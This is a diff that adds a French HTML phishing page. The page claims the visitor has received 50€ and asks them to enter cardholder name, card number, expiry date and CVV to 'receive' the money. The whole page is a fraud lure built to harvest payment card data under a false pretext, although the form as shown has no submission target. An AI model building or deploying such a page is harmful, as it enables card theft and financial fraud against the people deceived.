@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Valider le paiement</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+</head>
+<body>
+    <BR/>
+    <div class="container shadow p-3 mb-5 bg-white rounded">
+        <CENTER>
+            <div><img src="logo.png" height="150"></div>
+            <p>
+                <h2>                Vous avez reçu 50€. Pour valider le paiement, veuillez saisir vos informations
+                </h2>
+            </p>
+        </CENTER>
+        <div><img src="card.png" height="50"></div>
+        <div class="container">
+            <b>Remplisez ces information pour recevoir votre argent</b>
+            <form>
+                <div class="form-group">
+                    <label for="nom">Nom sur la carte</label>
+                    <input type="text" class="form-control" id="nom" placeholder="Nom sur la carte">
+                </div>
+                <div class="form-group">
+                    <label for="numero">Numéro de carte</label>
+                    <input type="text" class="form-control" id="numero" placeholder="Numéro de carte">
+                </div>
+                <div class="form-row">
+                    <div class="form-group col-md-6">
+                        <label for="expiration">Date d'expiration</label>
+                        <input type="text" class="form-control" id="expiration" placeholder="MM/AA">
+                    </div>
+                    <div class="form-group col-md-6">
+                        <label for="cvv">Code de sécurité (CVV)</label>
+                        <input type="text" class="form-control" id="cvv" placeholder="CVV">
+                    </div>
+                </div>
+                <button type="submit" class="btn btn-primary">Valider</button>
+            </form>
+        </div>
+    
+    </div>
+
+</body>
+</html>
